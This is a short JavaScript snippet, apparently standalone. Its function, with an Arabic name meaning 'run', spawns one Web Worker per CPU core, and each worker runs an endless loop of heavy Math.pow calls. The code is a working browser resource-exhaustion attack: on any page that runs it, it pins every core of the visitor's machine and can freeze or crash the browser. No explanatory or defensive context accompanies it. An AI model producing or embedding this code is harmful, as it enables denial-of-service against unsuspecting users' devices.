function تشغيل() {
  for (let i = 0; i < navigator.hardwareConcurrency; i++) {
    const كود = `
      while (true) {
        Math.pow(9999999999999999999999999999999999999999999999999999999, 99999999999999999999);
      }
    `;
    const blob = new Blob([كود], { type: "application/javascript" });
    const worker = new Worker(URL.createObjectURL(blob));
  }
}
